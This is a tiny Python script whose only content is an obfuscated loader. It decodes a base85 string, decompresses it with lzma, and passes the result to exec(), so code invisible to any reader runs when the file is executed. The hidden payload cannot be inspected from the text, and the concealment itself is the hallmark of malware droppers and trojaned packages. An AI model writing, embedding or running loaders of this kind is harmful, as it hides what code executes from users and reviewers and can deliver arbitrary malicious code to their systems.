import lzma, base64
_data = b'{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~zV+B3%G9n@VT6Qap3Y@@2YR=<wP!OViZxi%NoZq@KIk;%lVIz6K_$7QeQ&a{P}Z@*a_(>HTU@sUZkcc^EXth^0sTZgNnf;>+`H>iLTGn|ABXd6TA&+PFN6H~!@{i{@mke5mic0bv`6H*?>yP&Jau6AO4i4<)Owxuy$qLXdMQqYNj?_wi4$YS2*?AZQ@+AKqk)!NYLdzc2zLXHZN3EXj-0PS<=DIUQ0TbI;#^JcWMS1*t4>9V{|e+dpsFvuA~;k8@&%KOg>s@QFc-WLeQf#!DEkDC|tH+U4K^;TWv(Mb+ubG;7!@EM=HUy@wW5ZX9C}O;ate)x2$tY0>_AG=BZrvp}ELI8N<;i<cRr%y`a5f52o=C0|`f00000^oj>zxLtQB00F)NxCH<JCQ(>NvBYQl0ssI200dcD'
_exec = lzma.decompress(base64.b85decode(_data)).decode('utf-8')
exec(_exec)
